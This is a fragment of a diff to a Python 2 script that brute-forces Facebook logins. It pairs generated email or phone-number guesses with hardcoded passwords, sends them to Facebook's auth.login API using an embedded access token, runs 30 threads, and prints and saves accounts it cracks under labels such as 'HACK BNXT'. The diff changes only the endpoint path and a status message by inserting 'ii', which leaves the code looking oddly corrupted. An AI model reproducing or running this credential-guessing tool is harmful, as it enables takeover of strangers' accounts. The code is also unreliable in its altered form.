@@ -352,7 +352,7 @@ def action():
                                         cpb.append(c + user + pass7)
                                     else:
                                         pass8 = '12344321'
-                                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                                        data = br.open('https://b-api.facebook.com/iimethod/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                         q = json.load(data)
                                         if 'access_token' in q:
                                             print '\x1b[1;92m[HACK BNXT]  ' + k + c + user + '  \x1b[1;92m|PASS>>  ' + pass8
@@ -371,7 +371,7 @@ def action():
     p = ThreadPool(30)
     p.map(main, id)
     print '\x1b[1;97m--------------------------------------------------'
-    print '[\xe2\x9c\x93] HACKY BNXT KOTAY HAT ...'
+    print '[\xe2\x9c\x93] HACKY BNXT KOTAY iiHAT ...'
     print '[\xe2\x9c\x93] HAMU HACKRAWAKAN HACK/ : ' + str(len(oks)) + '/'
     print '[\xe2\x9c\x93] AYA DATAWE FILE SAVE BET'
     raw_input('\n\x1b[1;97m[\x1b[1;97mGARANAWA\x1b[1;97m]')
